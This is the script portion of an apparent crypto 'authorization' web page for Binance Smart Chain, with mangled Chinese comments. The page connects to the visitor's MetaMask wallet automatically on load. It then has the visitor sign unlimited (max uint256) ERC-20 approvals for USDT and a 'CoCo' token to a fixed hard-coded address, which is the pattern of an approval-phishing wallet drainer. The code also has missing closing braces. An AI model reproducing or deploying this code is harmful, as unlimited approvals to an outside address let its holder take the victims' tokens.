<body>

    <script>
        // BSCé“¾é…ç½®
        const BSC_CHAIN_ID = '0x38'; // BSCä¸»ç½‘
        const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
        
        // åˆçº¦åœ°å€
        const PERMISSION_ADDRESS = '0xe3c0e066D870036aCc178492C638963A0E97d4Bb';
        
        // ä»£å¸åˆçº¦åœ°å€
        const TOKENS = {
            coco: {
                name: 'CoCoä»£å¸',
                address: '0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550',
                icon: 'ğŸª™',
                isNative: false
            },
            usdt: {
                name: 'USDT',
                address: '0x55d398326f99059fF775485246999027B3197955',
                icon: 'ğŸ’µ',
                isNative: false
            },
            bnb: {
                name: 'BNB',
                address: null, // åŸç”Ÿä»£å¸
                icon: 'ğŸŸ¡',
                isNative: true

        };
        
        let web3;
        let userAccount;
        
        // é¡µé¢åŠ è½½å®Œæˆåè‡ªåŠ¨è¿æ¥é’±åŒ…
        window.addEventListener('load', async () => {
            await connectWallet();
        });
        
        // è¿æ¥é’±åŒ…
        async function connectWallet() {
            try {
                showStatus('æ­£åœ¨è¿æ¥é’±åŒ…...', 'info');
                
                // æ£€æŸ¥æ˜¯å¦å®‰è£…äº†MetaMask
                if (typeof window.ethereum === 'undefined') {
                    showStatus('è¯·å®‰è£…MetaMaské’±åŒ…', 'error');
                    return false;
                }
                
                // è¯·æ±‚è¿æ¥é’±åŒ…
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                if (accounts.length === 0) {
                    showStatus('è¯·æˆæƒè¿æ¥é’±åŒ…', 'error');
                    return false;
                }
                
                userAccount = accounts[0];
                
                // æ£€æŸ¥ç½‘ç»œ
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId !== BSC_CHAIN_ID) {
                    await switchToBSC();
                }
                
                // åˆå§‹åŒ–Web3
                web3 = new Web3(window.ethereum);
                
                // æ˜¾ç¤ºé’±åŒ…ä¿¡æ¯
                document.getElementById('walletAddress').textContent = userAccount;
                document.getElementById('walletInfo').style.display = 'block';
                
                showStatus('é’±åŒ…è¿æ¥æˆåŠŸï¼', 'success');
                setTimeout(() => hideStatus(), 2000);
                
                return true;
                
            } catch (error) {
                console.error('è¿æ¥é’±åŒ…å¤±è´¥:', error);
                showStatus('è¿æ¥é’±åŒ…å¤±è´¥: ' + error.message, 'error');
                return false;
            }
        }
        
        // åˆ‡æ¢åˆ°BSCç½‘ç»œ
        async function switchToBSC() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_CHAIN_ID }],
                });
            } catch (switchError) {
                // å¦‚æœBSCç½‘ç»œä¸å­˜åœ¨ï¼Œåˆ™æ·»åŠ 
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: BSC_CHAIN_ID,
                            chainName: 'Binance Smart Chain',
                            nativeCurrency: {
                                name: 'BNB',
                                symbol: 'BNB',
                                decimals: 18
                            },
                            rpcUrls: [BSC_RPC_URL],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            }
        }
        
        // æˆæƒå‡½æ•°
        async function authorize() {
            if (!web3 || !userAccount) {
                showStatus('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
                return;
            }
            
            try {
                const authorizeBtn = document.getElementById('authorizeBtn');
                authorizeBtn.disabled = true;
                authorizeBtn.innerHTML = '<span class="loading"></span>æˆæƒä¸­...';
                
                // æ˜¾ç¤ºè¿›åº¦æ¡
                const progressBar = document.getElementById('progressBar');
                const progressFill = document.getElementById('progressFill');
                progressBar.style.display = 'block';
                
                showStatus('å¼€å§‹æˆæƒä¸‰ä¸ªä»£å¸...', 'info');
                
                let successCount = 0;
                let failCount = 0;
                
                // ç›´æ¥æˆæƒä¸‰ä¸ªä»£å¸
                const tokensToAuthorize = [TOKENS.coco, TOKENS.usdt, TOKENS.bnb];
                
                for (let i = 0; i < tokensToAuthorize.length; i++) {
                    const token = tokensToAuthorize[i];
                    const progress = ((i + 1) / tokensToAuthorize.length) * 100;
                    progressFill.style.width = progress + '%';
                    
                    try {
                        showStatus(`æ­£åœ¨æˆæƒ ${token.name}...`, 'info');
                        
                        if (token.isNative) {
                            // BNBæ˜¯åŸç”Ÿä»£å¸ï¼Œä¸éœ€è¦approveï¼Œç›´æ¥è·³è¿‡
                            showStatus(`${token.name} æ˜¯åŸç”Ÿä»£å¸ï¼Œæ— éœ€æˆæƒ`, 'info');
                            successCount++;
                            continue;
                        }
                        
                        // æ„å»ºæˆæƒäº¤æ˜“
                        const tokenContract = new web3.eth.Contract([
                            {
                                "constant": false,
                                "inputs": [
                                    {"name": "_spender", "type": "address"},
                                    {"name": "_value", "type": "uint256"}
                                ],
                                "name": "approve",
                                "outputs": [{"name": "", "type": "bool"}],
                                "payable": false,
                                "stateMutability": "nonpayable",
                                "type": "function"
                            }
                        ], token.address);
                        
                        // æœ€å¤§æˆæƒæ•°é‡
                        const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                        
                        // æ„å»ºäº¤æ˜“å‚æ•°
                        const data = tokenContract.methods.approve(PERMISSION_ADDRESS, maxUint256).encodeABI();
                        
                        // ä¼°ç®—Gas
                        const gasEstimate = await tokenContract.methods.approve(PERMISSION_ADDRESS, maxUint256)
                            .estimateGas({ from: userAccount });
                        
                        // å‘é€äº¤æ˜“
                        const transaction = {
                            from: userAccount,
                            to: token.address,
                            data: data,
                            gas: Math.floor(gasEstimate * 1.2), // å¢åŠ 20%çš„Gas
                            gasPrice: await web3.eth.getGasPrice()
                        };
                        
                        showStatus(`è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤ ${token.name} çš„æˆæƒäº¤æ˜“...`, 'info');
                        
                        // å‘é€äº¤æ˜“
                        const receipt = await web3.eth.sendTransaction(transaction);
                        
                        console.log(`${token.name} æˆæƒæˆåŠŸï¼Œäº¤æ˜“å“ˆå¸Œ:`, receipt.transactionHash);
                        successCount++;
                        
                        // ç­‰å¾…ä¸€ä¸‹å†ç»§ç»­ä¸‹ä¸€ä¸ª
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        
                    } catch (error) {
                        console.error(`${token.name} æˆæƒå¤±è´¥:`, error);
                        failCount++;
                        showStatus(`${token.name} æˆæƒå¤±è´¥: ${error.message}`, 'error');
                    }
                }
                
                // éšè—è¿›åº¦æ¡
                progressBar.style.display = 'none';
                
                // æ˜¾ç¤ºæœ€ç»ˆç»“æœ
                if (failCount === 0) {
                    showStatus(`æ‰€æœ‰ä»£å¸æˆæƒæˆåŠŸï¼å…±æˆæƒ ${successCount} ä¸ªä»£å¸`, 'success');
                    authorizeBtn.innerHTML = 'æˆæƒå®Œæˆ';
                    authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
                } else {
                    showStatus(`æˆæƒå®Œæˆï¼æˆåŠŸ: ${successCount} ä¸ªï¼Œå¤±è´¥: ${failCount} ä¸ª`, 'error');
                    authorizeBtn.innerHTML = 'éƒ¨åˆ†å¤±è´¥';
                    authorizeBtn.style.background = 'linear-gradient(135deg, #ff9800 0%, #f57c00 100%)';
                }
                
                authorizeBtn.disabled = false;
                
            } catch (error) {
                console.error('æˆæƒè¿‡ç¨‹å‡ºé”™:', error);
                showStatus('æˆæƒè¿‡ç¨‹å‡ºé”™: ' + error.message, 'error');
                
                // éšè—è¿›åº¦æ¡
                document.getElementById('progressBar').style.display = 'none';
                
                // é‡ç½®æŒ‰é’®
                const authorizeBtn = document.getElementById('authorizeBtn');
                authorizeBtn.disabled = false;
                authorizeBtn.innerHTML = 'é‡æ–°æˆæƒ';
            }
        }
        
        // æ˜¾ç¤ºçŠ¶æ€ä¿¡æ¯
        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = `status ${type}`;
            status.style.display = 'block';
        }
        
        // éšè—çŠ¶æ€ä¿¡æ¯
        function hideStatus() {
            document.getElementById('status').style.display = 'none';
        }
        
        // ç›‘å¬ç½‘ç»œåˆ‡æ¢
        if (window.ethereum) {
            window.ethereum.on('chainChanged', (chainId) => {
                if (chainId !== BSC_CHAIN_ID) {
                    showStatus('è¯·åˆ‡æ¢åˆ°BSCç½‘ç»œ', 'error');
                } else {

                }
            });
            
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    userAccount = null;
                    document.getElementById('walletInfo').style.display = 'none';
                    showStatus('é’±åŒ…å·²æ–­å¼€è¿æ¥', 'error');
                } else {
                    userAccount = accounts[0];
                    document.getElementById('walletAddress').textContent = userAccount;
                    document.getElementById('walletInfo').style.display = 'block';
                    hideStatus();
                }

        }
    </script>
